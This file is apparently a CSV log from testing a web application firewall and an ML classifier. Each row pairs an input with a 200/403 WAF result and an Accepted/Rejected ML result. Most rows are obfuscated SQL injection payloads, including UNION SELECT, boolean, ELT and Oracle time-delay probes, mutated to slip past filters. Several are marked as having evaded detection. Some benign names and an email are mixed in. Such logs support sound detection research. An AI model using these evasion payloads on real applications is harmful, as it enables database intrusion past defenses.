Timestamp,Payload,WAF_Prediction_Timestamp,WAF_Prediction,ML_Prediction_Timestamp,ML_Prediction
2024-09-03T12:37:17.183814,"-7347"""")) union/**/all sEleCt (SELECT
2112) like 2112,(SELECT 1),4360,4360,4360,4360,4360,4360,4360#j",2024-09-03T12:37:17.190878,200,2024-09-03T12:37:23.007557,Rejected
2024-09-03T12:37:23.526862,"-7347"""")) union/**/all/*NiY,G*/seLEcT (sElEcT	2112) LikE 2112,(SeLeCT 0x1),'UV4' NOT LIKE 'UV4Y',4360, and 1,4360,4360,4360,4360#j",2024-09-03T12:37:23.532361,200,2024-09-03T12:37:29.885610,Rejected
2024-09-03T12:37:30.410514,"-(seLeCT 7347)""""))/*3c*/union/**/all/**/selECT (sELEcT	2112) likE 2112,(SELEct 0x1),'UV4' not like
'UV4Y',4360, anD 1,4360,4360,3276<> OR 0,4360#j",2024-09-03T12:37:30.413900,403,2024-09-03T12:37:37.901616,Rejected
2024-09-03T12:37:38.425777,"-(SelECT 7347)""""))/*3c*/union/**/all/**/sELECt (Select	2112) liKe 2112,(SELeCT/**/0x1),'UV4'	not like
'UV4Y',(SElecT 1), AnD 1,4360,4360,5058<>5059<> or (SELECT 0),4360#j#p",2024-09-03T12:37:38.429571,403,2024-09-03T12:37:46.990862,Rejected
2024-09-03T12:37:47.516412,"-(SelEct 7347)""""))/*3c*/union/*-	*/all/**/SeLecT (SelEcT	 OR 0) lIKE 2112,(SelECt 0x1),'UV4'
not like
'UV4Y',(seLeCT 1), aNd 0x1,'o0' NOT LIKE 'o0k',4360,5058<>5059<> or (SeLeCT 0),4360#j#p",2024-09-03T12:37:47.519671,403,2024-09-03T12:37:57.862992,Rejected
2024-09-03T12:37:58.396473,"-(SElEcT 7347)""""))/**/union/*-	*/all/**/SElECt (SelECt	 Or 0) liKE/**/2112,(SELecT 0x1),'UV4'
not like 'UV4Y',(Select 1), aNd 0x1,'o0' NOT LIKE 'o0k',4360, OR 0 not like (SELECT 5059)<> OR (SelEct 0),'D'='D'#j#p",2024-09-03T12:37:58.400300,403,2024-09-03T12:38:07.746498,Rejected
2024-09-03T12:38:08.269490,"-(seLECt  OR 0)""""))/**/union/*-	*/all sElEcT (SElect	 Or 0) lIKe/**/2112,(seLECt 0x1),'UV4'	not like 'UV4Y',(SeLect 1), AND 0x1,'o0' NOT LIKE 'o0k',(selECT 4360), Or 0 not like (sELEct 5059) NOT LIKE  OR (SElect 'Gc'='Gc'),'D'='D'#j#p",2024-09-03T12:38:08.273475,403,2024-09-03T12:38:20.207232,Rejected
2024-09-03T12:38:20.725106,"-(SElect  OR 0)""""))/**/union/**/all SelEcT/**/(sELECt	 oR  AND '1'!='11') lIKe/**/2112,(sElecT 0x1),'UV4'	not like 'UV4Y',(sELECt 1), AND 0x1,'o0'
not like 'o0k',(seLeCt 4360), oR 0 not like (SELECT 0x13c3) NOT LIKE  or (SeLect 'Gc'='Gc'),'D'='D'#j#p ;I",2024-09-03T12:38:20.730022,403,2024-09-03T12:38:32.743494,Rejected
2024-09-03T12:38:33.270492,"-(SElEct  OR (SELecT 0))""""))/**/union/**/all sElect/**/(SElect	 Or  aND '1896 IN (1895,1896,1897)'!='11') lIke/**/2112,(SelECt 0x1),'UV4' not like 'UV4Y',(seLEct 1), aNd 0x1,'o0'
not like 'o0k',(sELECt 4360), or  oR 0 not like (SElEcT/**/0x13c3) NOT LIKE  oR (SeLECT 'Gc'='Gc'),'D' LIKe 'D'#j#p ;I3",2024-09-03T12:38:33.273589,403,2024-09-03T12:38:45.695397,Rejected
2024-09-03T12:38:46.211913,"-(SELeCT  or (SeleCT 0))"""")) union/**/all seLeCT/**/(SElECt	 Or  and ' OR 0 IN (1895,1896,1897)'!='0xb') LiKE/*""XR[*/'[>m4' LIKE '[>m4',(SeLECT 0x1),'UV4' not like 'UV4Y',(seleCT 1), AnD
0x1,'o0'
not like 'o0k',(SElEcT 4360), Or  Or 0 not like (seLecT/**/0x13c3) not like  or (SeLEcT 'Gc'='Gc'),'D' like 'D'#j#p ;I3",2024-09-03T12:38:46.215667,403,2024-09-03T12:39:00.198668,Rejected
2024-09-03T12:39:00.709186,"1%') union all select null,null,null#",2024-09-03T12:39:00.716974,403,2024-09-03T12:39:02.308592,Rejected
2024-09-03T12:39:02.318191,"0x1%') union/**/all	sEleCt null,null,null#",2024-09-03T12:39:02.321696,403,2024-09-03T12:39:04.150521,Accepted
2024-09-03T12:39:04.666466,"0x1%')/**/union/**/all	select	null,null,null#",2024-09-03T12:39:04.672502,403,2024-09-03T12:39:06.760690,Accepted
2024-09-03T12:39:07.276081,"0x1%')/*c2*/union all
SelEcT	null,null,null#",2024-09-03T12:39:07.281985,403,2024-09-03T12:39:09.312475,Rejected
2024-09-03T12:39:09.828697,"0x1%') union
all
SeleCT	null,null,null#M",2024-09-03T12:39:09.834599,403,2024-09-03T12:39:11.886935,Rejected
2024-09-03T12:39:12.402937,"0x1%')/**/union
all	SEleCt	null,null,null#MQ",2024-09-03T12:39:12.407706,403,2024-09-03T12:39:14.475326,Accepted
2024-09-03T12:39:14.985570,"0x1%') union	all	seLeCt	null,null,null#MQ	:",2024-09-03T12:39:14.989350,403,2024-09-03T12:39:17.041899,Accepted
2024-09-03T12:39:17.556803,"0x1%')
union	all	SElect	null,null,null#MQ	:LA",2024-09-03T12:39:17.563469,403,2024-09-03T12:39:19.672397,Accepted
2024-09-03T12:39:20.188074,"0x1%') union	all	SeLEct	null,null,null#MQ	:LA",2024-09-03T12:39:20.194196,403,2024-09-03T12:39:22.332868,Rejected
2024-09-03T12:39:22.853249,"0x1%')
union	all	SElecT	null,null,null#MQ	:LA",2024-09-03T12:39:22.861786,403,2024-09-03T12:39:24.975028,Accepted
2024-09-03T12:39:25.490374,"0x1%')
union	all	SelECt	null,null,null#MQ
:LAh",2024-09-03T12:39:25.496715,403,2024-09-03T12:39:27.656281,Accepted
2024-09-03T12:39:28.165530,-3938%'))) or 2034=7209#,2024-09-03T12:39:28.170273,403,2024-09-03T12:39:29.323646,Rejected
2024-09-03T12:39:29.331765,"-3938%')))
OR 2034 LIKE (SELeCt (sELeCt 1))#5384/**/NOT LIKE 5385",2024-09-03T12:39:29.335180,403,2024-09-03T12:39:32.183930,Rejected
2024-09-03T12:39:32.702236,"- ANd 0x1%')))
or 2034
lIke (SeLecT (SELect 9969 IN (9968,9969,9970)))#5384/**/NOT/**/Like 5385",2024-09-03T12:39:32.716366,403,2024-09-03T12:39:37.054285,Rejected
2024-09-03T12:39:37.573274,"- and 0x1%')))
or 2034
lIke (SeLecT (SELect	9969 IN ( AND/**/1,9969,9970)))#'""'='""'/*!h""*/NOT/**/LIkE 0x1509",2024-09-03T12:39:37.578427,403,2024-09-03T12:39:42.751528,Rejected
2024-09-03T12:39:43.266863,"- AND
0x1%')))
or (SELECT 2034)
lIke (SeLecT (SELect	9969 IN ( AND  AND 1,'eb lIke '<>'eb==',9970)))#'""'='""'/*!h""*/NOT/**/lIkE 0x1509",2024-09-03T12:39:43.277456,403,2024-09-03T12:39:49.117465,Rejected
2024-09-03T12:39:49.635475,"- and
0x1%')))
or (SELECT 2034) lIke (SeLecT (SELect	9969 IN ( AND  AND 0x1,'eb likE '<>'eb==', OR 'j'='j')))#'""'='""' NOT/*4i*/LIke 0x1509",2024-09-03T12:39:49.642099,403,2024-09-03T12:39:55.616461,Rejected
2024-09-03T12:39:56.128174,"- aND
0x1%')))
or (SELECT (SELECT ')'<>')+')) lIke (SeLecT
(SELect	0x26f1 IN ( AND  AND 0x1,'eb/**/LIkE '<>'eb==', OR 'j'='j')))#'""'='""' NOT/**/LiKE 0x1509",2024-09-03T12:39:56.133717,403,2024-09-03T12:40:03.154009,Rejected
2024-09-03T12:40:03.673935,"-	anD
0x1%')))
or (SELECT (SELECT ')'<>')+')) lIke (SeLecT
(SELect	0x26f1 IN ( AND  AND 0x1,'eb lIke '<>'eb==', OR  OR '\' LIKE '\')))#'""'='""' NOT/**/lIKE 0x1509",2024-09-03T12:40:03.678599,403,2024-09-03T12:40:10.526757,Rejected
2024-09-03T12:40:11.045887,"-	And 0x1%')))
or (SELECT (SELECT ')'<>')+')) lIke (SeLecT
(SELect	0x26f1 IN ( AND  AND 0x1,'eb LikE '<>'eb==', OR  OR '\' LIKE '\')))#'""'='""' NOT/**/like/*mvok*/0x1509",2024-09-03T12:40:11.052327,403,2024-09-03T12:40:18.387583,Rejected
2024-09-03T12:40:18.903173,"-	&& 0x1%')))
or (SELECT (SELECT ')'<>')+')) lIke (SeLecT
(SELect	0x26f1 IN ( AND  AND 0x1,'eb lIKe '<>'eb==', OR  OR '\' LIKE '\')))#'""'='""' NOT/*[g1?*/lIKe 0x1509",2024-09-03T12:40:18.907248,403,2024-09-03T12:40:26.173128,Rejected
2024-09-03T12:40:26.693235,"-	 anD  0x1%')))
or (SELECT (SELECT ')'<>')+')) lIke (SeLecT
(SELect 0x26f1 IN ( AND  AND 0x1,'eb LiKE '<>'eb==', OR  OR '\' LIKE '\')))#'""'='""' NOT lIKe 0x1509",2024-09-03T12:40:26.697192,403,2024-09-03T12:40:33.754171,Rejected
2024-09-03T12:40:34.264536,"1"""") where 9962=9962 and 4595=4595#",2024-09-03T12:40:34.277527,200,2024-09-03T12:40:35.884943,Rejected
2024-09-03T12:40:35.893439,"1"""") wHEre 9962='B' NOT LIKE/*oT
*/'Bi' aND (SelecT 0x1) LiKe
4595#",2024-09-03T12:40:35.897262,200,2024-09-03T12:40:38.853412,Rejected
2024-09-03T12:40:39.375087,"(seLeCt/**/(SELECT 1))"""") WHerE 9962='B' not like/*oT */'Bi' anD (sELect 0x1) LIKE
2784=2784#",2024-09-03T12:40:39.379774,403,2024-09-03T12:40:43.306249,Rejected
2024-09-03T12:40:43.820979,"(SELeCT/**/(seLECt 1))"""")/*JYv5*/whERe  AND 1='B' not like/**/'Bi' and (sELEcT 0x1) liKE
2784=(SELECT 2679) not like 2680#",2024-09-03T12:40:43.824488,403,2024-09-03T12:40:49.499406,Rejected
2024-09-03T12:40:50.017636,"(SELecT (SELeCt 1))"""")/*JYv5*/WhERe  and 1='B' not like/**/'Bi' and (SElect 0x1) lIKE 2784=(sEleCT (seLEcT (SELECT 1))) not like 6847<>6848#",2024-09-03T12:40:50.020976,403,2024-09-03T12:40:55.921407,Rejected
2024-09-03T12:40:56.444223,"(SELeCT (selecT 1))"""")/*JYv5*/wHeRe  AND 1='B' not like 'Bi' ANd (SelECt 0x1)
LIKe 9314=9314 like (SELeCt (selEct (sElECt  AnD 0x1))) not like 6847<>6848#4",2024-09-03T12:40:56.449877,403,2024-09-03T12:41:03.072087,Rejected
2024-09-03T12:41:03.593671,"(SelECt (SElEcT  && 1))"""")/*JYv5*/WHere  aND 0x1='B' not/**/lIKe 'Bi' And (SeLecT 0x1) likE 9314=9314 likE (sElecT (SElecT (SELect  aNd 0x1))) not like 6847<>6848#'e'='e'z,",2024-09-03T12:41:03.598520,403,2024-09-03T12:41:11.254687,Rejected
2024-09-03T12:41:11.779468,"(SElEcT (sElECT  && 0x1))"""") WHeRE  anD 0x1='B' not/**/LiKE 'Bi' aNd (SEleCT 0x1) LIKE 9314=(sELEcT 1) lIke (sELect (SeLect (sElECt  ANd 0x1)))
not like 6847 not like 'y)'!='y)D'#'e'='e'z,ks",2024-09-03T12:41:11.782966,403,2024-09-03T12:41:20.374576,Accepted
2024-09-03T12:41:20.898766,"(seLecT (SeleCT  && 0x1))"""") wHERe  aNd 0x1='B'	not/*@*/LiKe 'Bi' anD (sELeCt 0x1) liKE 9314=(sElECT  oR 'k('!='k(Y') lIKE (select (sELecT (sELeCT  AnD 0x1)))
not like (SELECT 6847)/**/not like 'y)'!='y)D'#'e'='e'z,ks",2024-09-03T12:41:20.903025,403,2024-09-03T12:41:30.267889,Rejected
2024-09-03T12:41:30.794642,"(sElECt (sELEcT   AND  0x1))"""") where  AND 0x1='B'
not/*@*/like 'Bi' aNd (SEleCT 0x1) like (SELECT 9314)=(sElecT  Or 'k('!='k(Y') lIKE (seLect (sElecT (seLeCt  AND 0x1)))
not like (seLEcT/**/ OR 'lG'!='lG:')/**/not like 'y)'!='y)D'#'e'='e'z,ksB_",2024-09-03T12:41:30.798175,403,2024-09-03T12:41:41.785704,Rejected
2024-09-03T12:41:42.310014,"(SELEct (sElecT   ANd  0x1))"""") whERe  and 0x1='B'
not/*@*/Like 'Bi' aNd (seleCt 0x1) LIke (SElEcT 0x2462)=(seLecT  oR 'k('!='k(Y') LIKe (SelECt (seLect (SElEcT  AND 0x1))) not like (SEleCT/**/ Or 'lG'!='lG:')/**/not/**/LiKe 'y)'!='y)D'# AND 1z,ksB_<",2024-09-03T12:41:42.316935,403,2024-09-03T12:41:53.526577,Rejected
2024-09-03T12:41:54.038422,remo,2024-09-03T12:41:54.044757,200,2024-09-03T12:41:54.402579,Accepted
2024-09-03T12:41:54.410349,remo,2024-09-03T12:41:54.418787,200,2024-09-03T12:41:54.894567,Accepted
2024-09-03T12:41:55.409314,remo,2024-09-03T12:41:55.417892,200,2024-09-03T12:41:55.749392,Accepted
2024-09-03T12:41:56.257460,remo,2024-09-03T12:41:56.263311,200,2024-09-03T12:41:56.616698,Accepted
2024-09-03T12:41:57.126504,remo,2024-09-03T12:41:57.133766,200,2024-09-03T12:41:57.455800,Accepted
2024-09-03T12:41:57.967915,remo,2024-09-03T12:41:57.977044,200,2024-09-03T12:41:58.240810,Accepted
2024-09-03T12:41:58.751719,remo,2024-09-03T12:41:58.758838,200,2024-09-03T12:41:59.090248,Accepted
2024-09-03T12:41:59.601410,remo,2024-09-03T12:41:59.610496,200,2024-09-03T12:41:59.863094,Accepted
2024-09-03T12:42:00.375316,remo,2024-09-03T12:42:00.383806,200,2024-09-03T12:42:00.683799,Accepted
2024-09-03T12:42:01.197743,remo,2024-09-03T12:42:01.205881,200,2024-09-03T12:42:01.481111,Accepted
2024-09-03T12:42:01.992078,remo,2024-09-03T12:42:01.997660,200,2024-09-03T12:42:02.262883,Accepted
2024-09-03T12:42:02.773664,"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",2024-09-03T12:42:02.781349,403,2024-09-03T12:42:07.127125,Rejected
2024-09-03T12:42:07.139066,"1' In boolean mode);selECt dbms_pipe.receive_message(chr( and 1)||chr(0x43)||chr(79)||chr(6338!=6339),5)/**/FROM
dual#",2024-09-03T12:42:07.143204,403,2024-09-03T12:42:12.389553,Accepted
2024-09-03T12:42:12.911782,"1' iN boolean mode);SelecT dbms_pipe.receive_message(chr( aND 1)||chr(0x43) or chr(1100!=1101)||chr((seLEcT 1)!=0x18c3),5) FrOm dual#:x",2024-09-03T12:42:12.915227,403,2024-09-03T12:42:18.669261,Accepted
2024-09-03T12:42:19.191936,"(SeLECt 1)' in boolean mode);selECt/**/dbms_pipe.receive_message(chr( aNd 1)||chr(0x43) oR chr(1100!=':P' LIKE ':P')||chr((sElEct 1) not like 0x18c3), AnD 1) fRoM	dual#:xy",2024-09-03T12:42:19.196840,403,2024-09-03T12:42:26.905320,Accepted
2024-09-03T12:42:27.424540,"(SelECt '-' lIKE '-')' in boolean mode);selECt/**/dbms_pipe.receive_message(chr( aNd 1)||chr(0x43) oR chr(1100!=':P' LIKE ':P')||chr((selECT 0x1)/**/not like 0x18c3), anD  OR 0) FROM dual#:xy%)",2024-09-03T12:42:27.429567,403,2024-09-03T12:42:35.646936,Accepted
2024-09-03T12:42:36.157710,"(SELECt '-' LIKe '-')' in boolean mode);selECt/**/dbms_pipe.receive_message(chr( aNd (SELECT 1))||chr(0x43) oR/**/chr(8428 IN ((SELECT 1),8428,8429)!=':P' LIKE ':P') Or chr((selecT 0x1)/**/not like	0x18c3), aND  OR 0) from dual#:xy%)*@",2024-09-03T12:42:36.162802,403,2024-09-03T12:42:46.761315,Rejected
2024-09-03T12:42:47.274315,"(SelecT '-' LIkE '-')' in boolean	mode);selECt/**/dbms_pipe.receive_message(chr( aNd (SELECT 1))||chr(0x43) oR/**/chr(0x20ec IN ((SELECT  OR 0),8428,'v/'='v/')!=':P' LIKE ':P') oR chr((SelECT 0x1)/**/not like	0x18c3), aNd  or 0)/**/frOm dual#:xy%)*@iP",2024-09-03T12:42:47.278952,403,2024-09-03T12:42:57.866972,Accepted
2024-09-03T12:42:58.388022,"(selECt '-' LiKE '-')' in boolean
mode);selECt/**/dbms_pipe.receive_message(chr( aNd (SELECT 'z'!='z:'))||chr(0x43) oR/**/chr(0x20ec IN ((SELECT  OR/**/(SELECT 0)),8428,'v/'='v/')!=':P' LIKE ':P') oR chr((SELEcT 0x1)/**/not like	0x18c3), AND  oR (select 1))/**/fROM dual#:xy%)*@iP;h",2024-09-03T12:42:58.393959,403,2024-09-03T12:43:10.483594,Rejected
2024-09-03T12:43:10.998090,"(sELecT '-' liKE '-')' in boolean
mode);selECt dbms_pipe.receive_message(chr( aNd (SELECT 'z'!='z:'))||chr(0x43) oR/**/chr(0x20ec IN ((SELECT  OR/**/(SELECT  OR '@'='@')),(SELECT 8428),'v/'='v/')!=':P' LIKE ':P') OR chr((seLeCt 0x1)/**/not like 0x18c3), &&  Or (SeLEcT 1))/**/FrOM dual#:xy%)*@iP;hW",2024-09-03T12:43:11.002161,403,2024-09-03T12:43:23.107076,Rejected
2024-09-03T12:43:23.634485,"(seleCT '-' lIKE '-')' in boolean
mode);selECt dbms_pipe.receive_message(chr( aNd (SELECT 'z'!='z:'))||chr(0x43) oR chr(0x20ec IN ((SELECT  OR/**/(SELECT  OR '@'='@')),(SELECT 2706 IN ((SELECT 2705),2706, OR 0)),'v/'='v/')!=':P' LIKE ':P') OR chr((seLeCt 0x1)/**/not like 0x18c3),  AND
  or (sElEct 1))/*5w{*/FROM dual#:xy%)*@iP;hW",2024-09-03T12:43:23.638405,403,2024-09-03T12:43:37.578065,Rejected
2024-09-03T12:43:38.106538,"(SeLECt '-' LikE '-')'
in boolean
mode);selECt dbms_pipe.receive_message(chr( aNd (SELECT 'z'!='z:'))||chr(0x43) oR chr(0x20ec IN ((SELECT  OR/**/(SELECT  OR '@'='@')),(SELECT 2706 IN ((SELECT 2705),(SELECT 2706), OR 3965 IN (3964,3965,3966))),'v/'='v/')!=':P'/*,L}*/LIKE ':P') Or chr((seLEcT 0x1)/**/not like 0x18c3),  and
  Or (SEleCt  OR 0))/**/FRom dual#:xy%)*@iP;hW",2024-09-03T12:43:38.114262,403,2024-09-03T12:43:54.293138,Rejected
2024-09-03T12:43:54.801625,sterland@zingtonos.vg,2024-09-03T12:43:54.805724,200,2024-09-03T12:43:55.734264,Accepted
2024-09-03T12:43:55.740278,sterland@zingtonos.vg,2024-09-03T12:43:55.744174,200,2024-09-03T12:43:56.710800,Accepted
2024-09-03T12:43:57.219089,sterland@zingtonos.vg,2024-09-03T12:43:57.223210,200,2024-09-03T12:43:58.172449,Accepted
2024-09-03T12:43:58.686722,sterland@zingtonos.vg,2024-09-03T12:43:58.693442,200,2024-09-03T12:43:59.692915,Accepted
2024-09-03T12:44:00.201425,sterland@zingtonos.vg,2024-09-03T12:44:00.206135,200,2024-09-03T12:44:01.168497,Accepted
2024-09-03T12:44:01.682551,sterland@zingtonos.vg,2024-09-03T12:44:01.691212,200,2024-09-03T12:44:02.633033,Accepted
2024-09-03T12:44:03.143836,sterland@zingtonos.vg,2024-09-03T12:44:03.152418,200,2024-09-03T12:44:04.090006,Accepted
2024-09-03T12:44:04.607707,sterland@zingtonos.vg,2024-09-03T12:44:04.613400,200,2024-09-03T12:44:05.573431,Accepted
2024-09-03T12:44:06.085219,sterland@zingtonos.vg,2024-09-03T12:44:06.092998,200,2024-09-03T12:44:07.081251,Accepted
2024-09-03T12:44:07.595737,sterland@zingtonos.vg,2024-09-03T12:44:07.604544,200,2024-09-03T12:44:08.555927,Accepted
2024-09-03T12:44:09.068256,sterland@zingtonos.vg,2024-09-03T12:44:09.074946,200,2024-09-03T12:44:10.077420,Accepted
2024-09-03T12:44:10.589770,"1) and elt(7425=8842,8842) and (9194=9194",2024-09-03T12:44:10.595958,403,2024-09-03T12:44:12.324596,Rejected
2024-09-03T12:44:12.335284,"/**/OR 0) aNd elt(7425=8842,(sElect 8842)) and
(1299 LIkE 1299=9194",2024-09-03T12:44:12.341590,200,2024-09-03T12:44:15.547694,Accepted
2024-09-03T12:44:16.068990,"/**/or	0) AnD elt((sElECT 1)=8842,(seLECT (sElEct 8842)))/**/anD
(6770 LIKE 6770 LIke 1299 liKE 9194",2024-09-03T12:44:16.076327,200,2024-09-03T12:44:20.343878,Accepted
2024-09-03T12:44:20.866721,"/**/OR	0) AnD elt((selECt 1)=8842,(seleCT (seLect 8842)))/**/and
('&Q' LIKE '&Q' LiKe	6770 LikE /**/or 0x0 like 9194",2024-09-03T12:44:20.873097,200,2024-09-03T12:44:25.655061,Rejected
2024-09-03T12:44:26.174771,"/*3*/oR	(SELECT 0)) And elt((SeLect 1)=8842,(seLeCT (sElecT 'bl' LIKE 'bl')))/**/aND ('&Q' LiKe '&Q' lIkE	(SEleCT 1)/**/LiKe /**/Or 0x0 like 9194",2024-09-03T12:44:26.178683,200,2024-09-03T12:44:32.229757,Accepted
2024-09-03T12:44:32.755708,"/*3*/OR	(sELECt 0)) And elt((SElEcT 1)=0x228a,(sElEcT (seleCt 'bl' LIKE 'bl')))/*#0L(*/aND ('&Q'
LikE '&Q' lIke	(SElecT 1) likE /**/or 0x0 liKe  or 0 IN (1429,1430,1431)",2024-09-03T12:44:32.759979,200,2024-09-03T12:44:40.301830,Rejected
2024-09-03T12:44:40.828243,"/**/OR (SeLeCt 0)) AnD elt((selEct 0x1)=0x228a,(SELECt (SELEct 'bl' LIkE 'bl')))/*#0L(*/anD ('&Q'
lIke '&Q' like	(SeleCT 1) LIke /**/oR 0x0 lIKE  OR  OR 0 IN (1429,1430,'>'/**/LIKE '>')k",2024-09-03T12:44:40.833581,200,2024-09-03T12:44:48.657157,Rejected
2024-09-03T12:44:49.180492,"/**/Or (SeLeCt (SELECT 1) NOT LIKE 8344)) And elt((seleCT
0x1)=0x228a,(SELEcT (sELECt 'bl' LIKe 'bl')))/*#0L(*/AND ('&Q'
LiKe '&Q' LIke	(SELecT 1) lIkE  or 0x0 lIKe  or  OR 0x0 In (1429,1430,'>'/*8^**/lIkE '>')k",2024-09-03T12:44:49.187706,200,2024-09-03T12:44:58.083592,Rejected
2024-09-03T12:44:58.607160,"Or (selEcT (selecT
1) NOT LIKE 8344)) and elt((SElect
0x1)=0x228a,(SeLect (SELeCt 'bl' lIkE 'bl')))/*#0L(*/&& ('&Q'
LIkE '&Q' like	(SeLeCT  AND 1) likE  OR 0x0 LiKE  oR  Or 0x0 IN (1708!=0x6ad,1430,'>'/*8^**/like '>')k~",2024-09-03T12:44:58.612561,200,2024-09-03T12:45:07.907191,Rejected
2024-09-03T12:45:08.423983,"or (SEleCt (select
1) not/**/liKe 8344)) and elt((SELEcT
0x1)=0x228a,(seLECt	(SelECT 'bl' lIkE 'bl')))/*#0L(*/&& ('&Q'
LIKe '&Q' LIKE	(SeLect  anD  anD 1) LIkE  Or 0x0 LIkE  oR  or 0x0 In (3501 like 3501!=0x6ad,1430,'>'/*0x8^**/LIke '>')k~G",2024-09-03T12:45:08.429995,200,2024-09-03T12:45:18.576725,Accepted
2024-09-03T12:45:19.110031,"oR (SelEcT (SelECT
0x1) not/**/LIkE 188<>189)) ANd elt((seLeCt
0x1)=0x228a,(SeLEcT	(sELeCt 'bl' LIkE 'bl')))/*#0L(*/&& ('&Q'
like '&Q' LIKE
(SElect  aND  AND 1) liKe  OR 0x0 LIkE  oR  OR 0x0 iN/**/(3501 LIke 3501!=0x6ad, anD 1,'>'/*0x8^**/LIKe '>')k~GK%",2024-09-03T12:45:19.118291,403,2024-09-03T12:45:29.943130,Accepted
2024-09-03T12:45:30.454737,sant celoni,2024-09-03T12:45:30.464016,200,2024-09-03T12:45:31.002681,Rejected
2024-09-03T12:45:31.009751,sant	celoni,2024-09-03T12:45:31.013383,200,2024-09-03T12:45:31.581375,Accepted
2024-09-03T12:45:32.091512,"sant
celoni",2024-09-03T12:45:32.095297,200,2024-09-03T12:45:32.634679,Accepted
2024-09-03T12:45:33.148182,sant/**/celoni,2024-09-03T12:45:33.155989,200,2024-09-03T12:45:33.812926,Accepted
2024-09-03T12:45:34.319882,sant celoni,2024-09-03T12:45:34.323578,200,2024-09-03T12:45:34.866256,Rejected
2024-09-03T12:45:35.377803,"sant
celoni",2024-09-03T12:45:35.387771,200,2024-09-03T12:45:35.917356,Accepted
2024-09-03T12:45:36.425926,sant	celoni,2024-09-03T12:45:36.431440,200,2024-09-03T12:45:36.971181,Accepted
2024-09-03T12:45:37.483562,sant/**/celoni,2024-09-03T12:45:37.490749,200,2024-09-03T12:45:38.133397,Accepted
2024-09-03T12:45:38.646905,sant/*/**/P*/celoni,2024-09-03T12:45:38.653791,403,2024-09-03T12:45:39.773957,Accepted
2024-09-03T12:45:40.282363,sant/*r7glM*/celoni,2024-09-03T12:45:40.286194,200,2024-09-03T12:45:41.170419,Accepted
2024-09-03T12:45:41.682922,sant/*'=#'='=#'\DQq*/celoni,2024-09-03T12:45:41.688332,403,2024-09-03T12:45:42.896468,Rejected
2024-09-03T12:45:43.405958,hontangas,2024-09-03T12:45:43.415667,200,2024-09-03T12:45:43.860024,Accepted
2024-09-03T12:45:43.868057,hontangas,2024-09-03T12:45:43.872128,200,2024-09-03T12:45:44.357865,Accepted
2024-09-03T12:45:44.869251,hontangas,2024-09-03T12:45:44.877664,200,2024-09-03T12:45:45.327579,Accepted
2024-09-03T12:45:45.840883,hontangas,2024-09-03T12:45:45.845794,200,2024-09-03T12:45:46.301391,Accepted
2024-09-03T12:45:46.813196,hontangas,2024-09-03T12:45:46.821237,200,2024-09-03T12:45:47.277884,Accepted
2024-09-03T12:45:47.790223,hontangas,2024-09-03T12:45:47.799152,200,2024-09-03T12:45:48.422772,Accepted
2024-09-03T12:45:48.933090,hontangas,2024-09-03T12:45:48.939132,200,2024-09-03T12:45:49.712612,Accepted
2024-09-03T12:45:50.223909,hontangas,2024-09-03T12:45:50.232537,200,2024-09-03T12:45:50.801910,Accepted
2024-09-03T12:45:51.309686,hontangas,2024-09-03T12:45:51.314390,200,2024-09-03T12:45:51.793177,Accepted
2024-09-03T12:45:52.302667,hontangas,2024-09-03T12:45:52.307541,200,2024-09-03T12:45:52.772025,Accepted
2024-09-03T12:45:53.285542,hontangas,2024-09-03T12:45:53.293294,200,2024-09-03T12:45:53.746904,Accepted
2024-09-03T12:45:54.257424,"1) and elt(7425=8842,8842) and (9194=9194",2024-09-03T12:45:54.262296,403,2024-09-03T12:45:56.183372,Rejected
2024-09-03T12:45:56.192920,"(seLEct/**/1)) aND elt(7425='L'	LIKE 'L',0x228a) and (9194=9194",2024-09-03T12:45:56.196099,403,2024-09-03T12:45:58.938396,Rejected
2024-09-03T12:45:59.458192,"(selEct 1)) and elt(0x1d01='L' lIKe 'L',0x228a) and ((SELECT 1)=6735 IN (6734,6735,6736)",2024-09-03T12:45:59.462986,403,2024-09-03T12:46:03.066292,Rejected
2024-09-03T12:46:03.586167,"(selEcT 1)) aNd elt(0x1d01='L' LIKE/**/'L',0x228a) AND
((sELecT  AND 1 IN (5749,5750,5751)) LIKe 0x1a4f iN (6734,6735,6736)",2024-09-03T12:46:03.591313,403,2024-09-03T12:46:08.663768,Rejected
2024-09-03T12:46:09.183510,"(SelECT/**/(sElEcT 1))) aNd elt(0x1d01 like 'L' Like/*|I*/'L',0x228a) AnD ((sELECt  aNd 1 in ((seLect 5749),5750,5751)) liKE 0x1a4f in (6679 LIkE 6679,6735,6736)",2024-09-03T12:46:09.187713,403,2024-09-03T12:46:16.489355,Rejected
